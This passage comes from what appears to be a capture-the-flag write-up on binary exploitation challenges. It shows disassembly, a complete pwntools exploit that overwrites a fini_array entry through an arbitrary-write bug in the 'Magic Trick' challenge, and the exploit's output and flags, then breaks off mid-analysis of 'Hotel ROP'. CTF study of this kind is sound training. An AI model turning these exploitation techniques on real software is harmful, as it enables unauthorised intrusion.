</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7f37b1589000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">plz</span> <span class="no">don</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">rop</span> <span class="no">me</span>
</span></span><span class="line"><span class="cl"><span class="nf">i</span> <span class="no">don</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">think</span> <span class="no">this</span> <span class="no">will</span> <span class="no">work</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="nf">dctf</span><span class="err">{</span><span class="no">D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3</span><span class="err">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
</span></span></code></pre></div><h3 id="magic-trick" class="relative group">Magic Trick <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#magic-trick" aria-label="Anchor">#</a></span></h3><p>This was kind of a good challenge, well kind of, first check the security mechanisms:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">checksec</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">checksec</span> <span class="no">for</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">dctf</span><span class="err">/</span><span class="no">magic_trick</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">Canary</span>                        <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">NX</span>                            <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">PIE</span>                           <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">Fortify</span>                       <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">RelRO</span>                         <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>Now, this shows off that that there’s Canary and NX protection while the PIE and RELRO is disabled, this means we can write the _fini_array or any of the Global Offset Table entries. The main function calls the magic function, checking it:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">magic</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">magic</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068d</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068e</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400691</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x20</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400695</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040069e</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006a2</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006a4</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x15e</span><span class="p">]</span>        <span class="c1"># 0x400809
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006ab</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400520</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006b0</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006b4</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006b7</span> <span class="err">&lt;+</span><span class="mi">42</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x165</span><span class="p">]</span>        <span class="c1"># 0x400823
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006be</span> <span class="err">&lt;+</span><span class="mi">49</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006c3</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400560</span> <span class="p">&lt;</span><span class="no">__isoc99_scanf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006c8</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x159</span><span class="p">]</span>        <span class="c1"># 0x400828
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006cf</span> <span class="err">&lt;+</span><span class="mi">66</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400520</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006d4</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x18</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006d8</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006db</span> <span class="err">&lt;+</span><span class="mi">78</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x141</span><span class="p">]</span>        <span class="c1"># 0x400823
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006e2</span> <span class="err">&lt;+</span><span class="mi">85</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006e7</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400560</span> <span class="p">&lt;</span><span class="no">__isoc99_scanf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006ec</span> <span class="err">&lt;+</span><span class="mi">95</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x153</span><span class="p">]</span>        <span class="c1"># 0x400846
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004006f3</span> <span class="err">&lt;+</span><span class="mi">102</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400520</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006f8</span> <span class="err">&lt;+</span><span class="mi">107</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x18</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004006fc</span> <span class="err">&lt;+</span><span class="mi">111</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x10</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400700</span> <span class="err">&lt;+</span><span class="mi">115</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400704</span> <span class="err">&lt;+</span><span class="mi">119</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400708</span> <span class="err">&lt;+</span><span class="mi">123</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">],</span><span class="no">rdx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040070b</span> <span class="err">&lt;+</span><span class="mi">126</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040070c</span> <span class="err">&lt;+</span><span class="mi">127</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400710</span> <span class="err">&lt;+</span><span class="mi">131</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400719</span> <span class="err">&lt;+</span><span class="mi">140</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x400720</span> <span class="p">&lt;</span><span class="no">magic</span><span class="p">+</span><span class="mi">147</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040071b</span> <span class="err">&lt;+</span><span class="mi">142</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400530</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400720</span> <span class="err">&lt;+</span><span class="mi">147</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000400721</span> <span class="err">&lt;+</span><span class="mi">148</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span></code></pre></div><p>We can see that the program calls scanf two times and take unsigned long long, first it takes a value, second input takes another input and attempt to write the value given by the first input to the address of the second input, that means it allow us to write any value to any address having r/w access to.
Since the RELRO is disabled, we can overwrite the destructors which will be run once the process will come to an end to the address of the win function which prints the flag:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf-chall-magic-trick.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7481</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;magic_trick&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;win&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__do_global_dtors_aux_fini_array_entry&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Running</span> <span class="n">the</span> <span class="n">exploit</span><span class="p">:</span><span class="o">-</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">python3</span> <span class="n">magic_trick</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">dctf</span><span class="o">-</span><span class="n">chall</span><span class="o">-</span><span class="n">magic</span><span class="o">-</span><span class="n">trick</span><span class="o">.</span><span class="n">westeurope</span><span class="o">.</span><span class="n">azurecontainer</span><span class="o">.</span><span class="n">io</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">7481</span><span class="p">:</span> <span class="n">Done</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;/home/d4mianwayne/Pwning/CTFs/ductf/magic_trick&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
</span></span><span class="line"><span class="cl">    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">No</span> <span class="n">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
</span></span><span class="line"><span class="cl">    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
</span></span><span class="line"><span class="cl"><span class="n">thanks</span>
</span></span><span class="line"><span class="cl"><span class="n">You</span> <span class="n">are</span> <span class="n">a</span> <span class="n">real</span> <span class="n">magician</span>
</span></span><span class="line"><span class="cl"><span class="n">dctf</span><span class="p">{</span><span class="mi">1</span><span class="n">_L1k3_M4G1c</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="ow">in</span> <span class="n">interactive</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
</span></span></code></pre></div><h3 id="hotel-rop" class="relative group">Hotel ROP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#hotel-rop" aria-label="Anchor">#</a></span></h3><p>This was yet another ROP challenge but kind of a twist on it, it has PIE and NX enabled but the Canary was disabled:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">checksec</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">checksec</span> <span class="no">for</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">hotel_rop</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">Canary</span>                        <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">NX</span>                            <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">PIE</span>                           <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">Fortify</span>                       <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">RelRO</span>                         <span class="p">:</span> <span class="no">Partial</span>
</span></span></code></pre></div><p>Now, checking the function it contains, we can see there are several user-defined functions:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">i</span> <span class="no">functions</span> 
</span></span><span class="line"><span class="cl"><span class="no">All</span> <span class="no">defined</span> <span class="no">functions</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Non-debugging</span> <span class="no">symbols</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001000</span>  <span class="no">_init</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001030</span>  <span class="no">puts@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001040</span>  <span class="no">system@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001050</span>  <span class="no">printf@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001060</span>  <span class="no">alarm@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001070</span>  <span class="no">fgets@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001080</span>  <span class="no">exit@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001090</span>  <span class="no">__cxa_finalize@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000000010a0</span>  <span class="no">_start</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000000010d0</span>  <span class="no">deregister_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001100</span>  <span class="no">register_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001140</span>  <span class="no">__do_global_dtors_aux</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001180</span>  <span class="no">frame_dummy</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001185</span>  <span class="no">loss</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000000011dc</span>  <span class="no">california</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001283</span>  <span class="no">silicon_valley</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000000000000131e</span>  <span class="no">vuln</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000000000000136d</span>  <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000000013b0</span>  <span class="no">__libc_csu_init</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001410</span>  <span class="no">__libc_csu_fini</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001414</span>  <span class="no">_fini</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>Checking for the function named main function, we can see it prints the address of the main function, so much for the PIE security, PIE can bypassed since we get the address of the function, we can obtain the base address of the ELF itself. Then it calls the function vuln:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000136d</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000136e</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001371</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0xa</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001376</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1060</span> <span class="p">&lt;</span><span class="no">alarm@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000137b</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xffffffffffffffeb</span><span class="p">]</span>        <span class="c1"># 0x136d &lt;main&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001382</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xdb7</span><span class="p">]</span>        <span class="c1"># 0x2140
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001389</span> <span class="err">&lt;+</span><span class="mi">28</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000138e</span> <span class="err">&lt;+</span><span class="mi">33</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1050</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001393</span> <span class="err">&lt;+</span><span class="mi">38</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001398</span> <span class="err">&lt;+</span><span class="mi">43</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x131e</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000139d</span> <span class="err">&lt;+</span><span class="mi">48</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000013a2</span> <span class="err">&lt;+</span><span class="mi">53</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000013a3</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000131e</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000131f</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001322</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x20</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001326</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xda3</span><span class="p">]</span>        <span class="c1"># 0x20d0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000132d</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
